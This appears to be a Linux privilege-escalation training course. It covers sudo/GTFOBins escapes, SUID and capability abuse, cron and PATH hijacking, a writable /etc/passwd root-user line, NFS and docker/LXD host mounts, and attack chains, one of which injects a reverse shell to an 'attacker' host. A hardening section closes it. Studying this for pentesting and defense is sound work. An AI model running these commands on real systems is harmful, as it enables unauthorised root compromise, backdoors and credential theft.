MODULE 01

Introduction to Privilege Escalation

Understand what privilege escalation is, why attackers need it, and the core mental model that drives every escalation path.

WHAT IS PRIVILEGE ESCALATION?

Privilege escalation is the act of exploiting a bug, design flaw, or misconfiguration to gain elevated access to resources that are normally protected.

In Linux, root (UID 0) is the ultimate target — it controls everything. Getting from a low-privilege shell to root is the goal.

"Linux does NOT randomly give root access.
Root is controlled through specific trust mechanisms.
If any one mechanism is weak → attacker becomes root."

WHY ATTACKERS NEED IT

🎯
Initial shells are limited
Web shells, reverse shells often land as www-data or low-priv user
🔓
Root unlocks everything
Read /etc/shadow, install backdoors, control all processes
🏆
Persistence requires root
Maintain access even after patches and reboots

The Linux Trust Model

Linux controls root access through specific trust mechanisms. Click each layer to see how attackers abuse it.

⚠ ATTACKER CORE TRUTH: Linux does NOT randomly give root. One weak trust layer = full compromise.
🧠
Layer 1 — Kernel Trust
The OS core — controls memory, CPU, processes. If vulnerable, grants instant root.
💀 EXPLOIT: uname -a → find old kernel → run public exploit → root shell bypassing all security
CRITICAL
👥
Layer 2 — User & Group Trust
Identity-based privilege. Group membership can silently grant elevated access.
💀 EXPLOIT: id reveals docker group → mount host filesystem → read /root → full compromise
HIGH
🔑
Layer 3 — Sudo Trust
Delegated root power for specific commands. Most common real-world escalation vector.
💀 EXPLOIT: sudo -l shows allowed binary → GTFOBins shell escape → root execution
HIGH
📁
Layer 4 — File Permission Trust
Execution-based privilege. SUID binaries run with owner's privileges — often root.
💀 EXPLOIT: find / -perm -4000 → find SUID binary → escape to shell → root
HIGH
⏰
Layer 5 — Scheduled Task Trust
Automation trust. Root blindly executes scripts at defined intervals.
💀 EXPLOIT: cat /etc/crontab → find writable script → inject reverse shell → wait for cron
MEDIUM
🛤️
Layer 6 — Execution Path Trust
Command resolution trust. Linux searches PATH directories in order to find executables.
💀 EXPLOIT: Create malicious binary in writable PATH dir → script resolves your binary first → root execution
MEDIUM
⚙️
Layer 7 — Service Trust
Daemon isolation trust. Services running as root with weak file permissions.
💀 EXPLOIT: Find writable systemd service → modify ExecStart → restart service → root code runs
MEDIUM
🐛
Layer 8 — Misconfiguration Trust
Human errors. Wrong permissions on critical files — no exploit needed.
💀 EXPLOIT: ls -la /etc/passwd is writable → add hacker:x:0:0::/root:/bin/bash → login as root

The 8 Privilege Layers

Click each layer to expand its attack logic, real-world analogy, and escalation workflow.

01
Kernel
OS core — the ultimate privilege controller
INSTANT ROOT
CONCEPT

The kernel is the brain of Linux. It manages memory, CPU, processes, and hardware. If vulnerable, attackers bypass ALL security and jump straight to root.

REAL-WORLD ANALOGY

The kernel = school principal. If principal is tricked → any student accesses staff room without guards stopping them.

kernel_exploit.sh
$ uname -a
Linux ubuntu 3.13.0-24-generic x86_64
$ searchsploit kernel 3.13
Linux Kernel 3.13.0 - 'CVE-2014-4014'
DirtyCOW - 'CVE-2016-5195'
# Compile & run exploit
root@ubuntu:~#
02
Users & Groups
Identity-based privilege — group membership matters
HIGH RISK

Linux decides privileges based on user identity and group membership. Some groups (docker, lxd, disk) carry hidden root-level power.

ATTACK LOGIC

No exploit needed. Just being in the docker group gives you full host root access through container mounting.

$ id
groups=1000(user),999(docker)
# docker group = root equivalent!
$ docker run -v /:/mnt alpine chroot /mnt sh
# whoami
root
03
Sudo Rules
Delegated root commands — most common real-world vector
VERY COMMON

Admins allow users to run specific commands as root. If that command can spawn a shell, the user becomes root without knowing the root password.

KEY TOOL: GTFOBins (gtfobins.github.io) lists every binary that can escape to shell.

$ sudo -l
(root) NOPASSWD: /usr/bin/vim
# vim can escape to shell!
$ sudo vim -c ':!/bin/bash'
root@machine:~#
04
File Permissions & SUID
Execution-based trust — SUID runs as owner
COMMON

SUID (Set User ID) makes a binary run with the file owner's privileges. If root-owned, any user executing it runs it as root.

Writable scripts owned by root are also dangerous — inject code, wait for root to run the script.

$ find / -perm -4000 2>/dev/null
/usr/bin/vim
$ ls -la /usr/bin/vim
-rwsr-xr-x 1 root root vim
# 's' bit = SUID set!
$ vim -c ':!/bin/bash -p'
root@machine:~#
05
Scheduled Tasks
Cron jobs — automatic root execution
REALISTIC

Cron runs tasks automatically. Root-owned jobs execute with root privileges. If the script is writable by attacker → inject code → wait → root shell.

STEALTH: No interaction needed. Root unknowingly executes your payload on schedule.

$ cat /etc/crontab
* * * * * root /home/user/backup.sh
$ ls -la /home/user/backup.sh
-rwxrwxr-x 1 root user backup.sh
# Writable by us!
$ echo "bash -p" >> backup.sh
# Wait 1 minute...
root@machine:~#
06
PATH & Execution Flow
Command resolution — control how binaries are found
ADVANCED

When a script runs backup without full path, Linux searches $PATH directories in order. Plant a malicious binary in a writable directory earlier in PATH.

Also: LD_PRELOAD injects malicious libraries before programs load, and wildcard injection in scripts passes attacker-controlled arguments.

$ echo $PATH
/home/user/bin:/usr/bin:/bin
# /home/user/bin is writable!
$ echo "bash -p" > /home/user/bin/backup
$ chmod +x /home/user/bin/backup
# Root script runs 'backup'
# Finds our fake binary first!
root@machine:~#
07
Services & Misconfigurations
Daemons, NFS, and human error
REALISTIC

Services running as root with weak permissions. NFS no_root_squash. Writable /etc/passwd. These are human mistakes that bypass all technical security.

Most common in real pentests — no CVE needed, just poor configuration management.

$ ls -la /etc/passwd
-rw-rw-r-- 1 root user /etc/passwd
# Writable by us!
$ echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
$ su hacker
root@machine:~#
08
Containers & Escapes
Docker/LXD group, namespace abuse, container breakout
MODERN

Container root ≠ host root. But docker/lxd group membership allows mounting host filesystem, effectively gaining host root.

Common in DevOps environments where developers need container access but shouldn't have root.

$ id
groups=999(docker)
$ docker run -v /:/hostfs --rm -it alpine
/ # chroot /hostfs
# whoami && hostname
root
actual-host-machine

PHASE 2 — SUDO MISCONFIGURATIONS

Abusing Delegated Trust

Admins delegate specific root commands to users for legitimate tasks. But many binaries can spawn shells — turning limited access into full root.

COMMON EXPLOITABLE BINARIES
vimnanolessmore findawkperlpython rubyluanmaptar

GTFOBins documents shell escape for each. Always check there after finding allowed binaries.

sudo_phase.sh
# Step 1: Check sudo rights
$ sudo -l
(root) NOPASSWD: /usr/bin/find

# Step 2: Research binary on GTFOBins
# find can execute commands!

uid=0(root)

$ sudo vim -c ':!/bin/bash'
PHASE 3 — SUID & FILE PERMISSIONS

Execution Context Abuse

SUID bit makes a binary execute with its owner's privileges. A root-owned SUID binary executed by any user runs as root.

Permission Notation:
-rwsr-xr-x = SUID set
The 's' replaces 'x' in owner field

Writable scripts: If root runs a script you can write to, inject code and wait.

suid_phase.sh
# Step 1: Find SUID binaries
$ find / -perm -4000 2>/dev/null
/usr/bin/vim
/usr/bin/python3

# Step 2: Check non-standard ones
$ ls -la /usr/bin/python3
-rwsr-xr-x 1 root root python3

# Step 3: Exploit
$ python3 -c 'import os; os.execv("/bin/bash", ["bash", "-p"])'
root@machine:~#
PHASE 4 — LINUX CAPABILITIES

Hidden Kernel Privileges

Capabilities are fine-grained privileges assigned to specific binaries. Unlike SUID, they're harder to detect and often overlooked.

DANGEROUS CAPABILITIES
cap_setuidChange UID to root (0)
cap_sys_adminNear-root system control
cap_dac_overrideBypass file permission checks
capabilities_phase.sh
# Step 1: Enumerate capabilities
$ getcap -r / 2>/dev/null
/usr/bin/python3 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep

# Step 2: Abuse cap_setuid
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@machine:~# id
uid=0(root) gid=1000(user)

# Not SUID... but still root!
PHASE 5 — CRON JOB EXPLOITATION

Automated Root Execution

Cron jobs execute automatically. Root doesn't review them — it just runs them. Control the script → control root execution.

ESCALATION CONDITIONS
✅ Root-owned cron script is world-writable
✅ Script path doesn't exist (create it)
✅ Script calls a binary in writable directory
✅ Wildcard in script can be abused
cron_phase.sh
# Step 1: Find cron jobs
$ cat /etc/crontab
*/1 * * * * root /opt/scripts/backup.sh

# Step 2: Check permissions
$ ls -la /opt/scripts/backup.sh
-rwxrwxr-x 1 root root backup.sh

# Step 3: Inject payload
$ echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> backup.sh
# Wait for next minute...
$ /tmp/bash -p
bash-5.0# id
uid=1000(user) euid=0(root)
PHASE 6 — PATH & ENVIRONMENT

Execution Flow Control

Three powerful vectors: PATH hijacking, LD_PRELOAD injection, and wildcard exploitation. All manipulate how commands execute, not what they are.

PATH Hijacking
Place fake binary before real one in PATH search order
LD_PRELOAD Injection
Force load malicious library before any program runs
Wildcard Injection
Create filenames that become command arguments via * expansion
path_phase.sh
# PATH Hijacking Example:
$ cat /opt/script.sh
#!/bin/bash
backup # No full path!

$ echo $PATH
/home/user/bin:/usr/bin:/bin
# /home/user/bin is writable!

$ echo "bash -p" > /home/user/bin/backup
$ chmod +x /home/user/bin/backup
# sudo runs /opt/script.sh
# Finds our 'backup' first!
root@machine:~#
PHASE 7 — SERVICES & MISCONFIGS

Human Error Exploitation

Most real-world escalations exploit simple admin mistakes, not complex CVEs. Writable service configs, exposed NFS shares, weak file permissions.

NFS no_root_squashRemote root → local root
Writable /etc/passwdAdd root user directly
Writable service fileInject into ExecStart
Readable /etc/shadowCrack root hash offline

$ showmount -e 192.168.1.100

$ mount -t nfs 192.168.1.100:/data /mnt
$ cp /bin/bash /mnt/bash
$ chmod +s /mnt/bash
# On target machine:
$ /data/bash -p

PHASE 8 — CONTAINER ESCAPES

Breaking Isolation Barriers

Containers share the host kernel. Misconfigured privileges allow mounting host filesystem — turning container root into host root.

DANGEROUS GROUPS
docker lxd disk video
Any of these groups can lead to full host compromise
containers_phase.sh
# LXD escape:
$ id
groups=116(lxd),1000(user)

# Create privileged container
$ lxc init ubuntu:18.04 privesc -c security.privileged=true
$ lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc -- /bin/bash
# chroot /mnt/root bash
root@host:~#
Full host root access!

MODULE 09

Real-World Attack Chains

Complete attack narratives from initial access to root. Understand the attacker thought process at each step.

SCENARIO 01

Web Shell → Sudo → Root

Classic web application attack chain. Low-priv web shell leads to root through sudo misconfiguration.

1
Initial foothold: SQL injection → file upload → web shell as www-data
2
Enumeration: sudo -l reveals (root) NOPASSWD: /usr/bin/python3
3
GTFOBins research: Python3 can spawn interactive shell with os.system
4
Exploitation: sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
5
Result: 🏆 Full root shell on web server
SCENARIO 02

Docker Group → Host Root

Developer account with docker access. No exploit needed — just group privilege abuse through container mounting.

1
Shell obtained: SSH access as developer account via credential stuffing
2
Group check: id reveals membership in docker group
3
Container launch: docker run -v /:/mnt --rm -it alpine mounts entire host filesystem
4
Chroot escape: chroot /mnt sh — now inside host with root context
5
Result: 🏆 Host root — read /etc/shadow, add SSH keys, install backdoor
SCENARIO 03

Writable Cron → Automatic Root

Stealthy scheduled task abuse. Attacker modifies script, waits, and receives root shell without direct interaction.

1
Shell obtained: Phishing → employee credentials → SSH as low-priv user
2
Cron discovery: cat /etc/crontab shows backup.sh runs every minute as root
3
Permission check: ls -la backup.sh — world-writable! -rwxrwxr-x
4
Payload injection: Append bash -i >& /dev/tcp/attacker/4444 0>&1 to script
5
Result: 🏆 Reverse root shell received in 60 seconds — silent escalation
SCENARIO 04

Capability Abuse → Root

Hidden privilege — no SUID, no sudo. Python3 with cap_setuid can change its own UID silently.

1
Initial check: No sudo rights, no obvious SUID binaries — seems locked down
2
Capability scan: getcap -r / 2>/dev/null reveals python3 has cap_setuid+ep
3
UID change: Python calls os.setuid(0) → process becomes root UID
4
Shell spawn: os.system("/bin/bash") — bash inherits root UID
5
Result: 🏆 Root shell via hidden capability — beginner defenders missed this

Supporting Tools

Tools assist the brain — they do NOT replace enumeration logic. Learn what each tool checks and how to interpret findings.

⚠ CRITICAL MINDSET
"Tools show symptoms. I must diagnose the vulnerability."
Run manual enumeration first → predict vectors → use tools to confirm → targeted exploitation
LinPEAS
Most comprehensive Linux privilege escalation enumeration script. Color-codes findings by severity. Covers almost every known attack vector.
  • SUID/SGID binaries and unusual permissions
  • Sudo rights and GTFOBins matches
  • Writable cron scripts and paths
  • Docker/LXD group membership
  • Linux capabilities on binaries
  • Kernel version and CVE matching
  • Credentials in config files
  • Network services and open ports
Maps to: ALL PHASES
$ chmod +x linpeas.sh && ./linpeas.sh
[+] Interesting SUID files
/usr/bin/python3
LinEnum
Checklist-based enumeration script. Simpler than LinPEAS but very structured — great for learning what questions to ask about a system.
  • System information and kernel version
  • Users, groups, and sudo permissions
  • SUID/GUID file listings
  • World-writable files and directories
  • Running services and processes
  • Cron jobs and scheduled tasks
Maps to: PHASES 1-7
$ ./linenum.sh -t
[-] Sudoers (privileged):
user ALL=(root) NOPASSWD: /usr/bin/find
Linux Smart Enum (LSE)
Progressive enumeration with severity levels. Start with a quick scan, dig deeper only where interesting findings emerge.
  • Level 0: Quick basic check
  • Level 1: Focused interesting areas
  • Level 2: Full comprehensive scan
  • Kernel CVE database matching
  • Service and application versions
Maps to: PHASES 1-8
$ ./lse.sh -l 1
[!] cap000 Capabilities set in binaries
/usr/bin/python3 = cap_setuid+ep
GTFOBins
Reference knowledge base. Documents how common Linux binaries can spawn shells, read files, and escalate privileges — essential for sudo and SUID abuse.
  • Shell escape techniques per binary
  • File read/write abuse methods
  • SUID exploitation approaches
  • Sudo-specific bypass techniques
  • Reverse shell generation methods
Maps to: PHASES 2-3

$ sudo less /etc/profile
:!/bin/bash
root@machine:~#
searchsploit / Exploit-DB
Maps discovered version numbers to publicly known exploits. Use after finding kernel version, service versions, or vulnerable application details.
  • Kernel version to CVE mapping
  • Service exploit database
  • Local privilege escalation exploits
  • Offline searchable exploit archive

Defense & Hardening

Understanding attacks enables better defense. Compare vulnerable vs hardened configurations across all privilege escalation vectors.

1. KERNEL PATCHING

❌ VULNERABLE
Linux 3.13.0 (2014)
Vulnerable to DirtyCOW, many kernel CVEs
No automatic security updates
✅ HARDENED
Linux 6.x (current LTS)
Automatic security updates enabled
unattended-upgrades configured

2. SUDO CONFIGURATION

❌ VULNERABLE
user ALL=(ALL) NOPASSWD: ALL
user ALL=(root) NOPASSWD: /usr/bin/vim
Allows shell-spawning binary as root
✅ HARDENED
user ALL=(root) /usr/bin/service apache2 restart
Only necessary, non-exploitable commands
Requires password for all sudo

3. FILE PERMISSIONS

❌ VULNERABLE
-rwsr-xr-x root root /usr/bin/vim (SUID)
-rw-rw-r-- root user /etc/passwd
-rwxrwxr-x root root /opt/backup.sh
✅ HARDENED
find / -perm -4000 → minimal SUID set
-rw-r--r-- root root /etc/passwd
chmod 750 /opt/scripts/*.sh

4. CRON SECURITY

❌ VULNERABLE
* * * * * root /home/user/backup.sh
Script world-writable by any user
✅ HARDENED
chmod 700 /root/scripts/backup.sh
chown root:root /root/scripts/backup.sh
Scripts only writable by owner (root)

5. CONTAINER SECURITY

❌ VULNERABLE
Developer added to docker group
No rootless Docker configured
Containers run with --privileged
✅ HARDENED
Rootless Docker / Podman deployment
User namespaces enabled
seccomp and AppArmor profiles applied
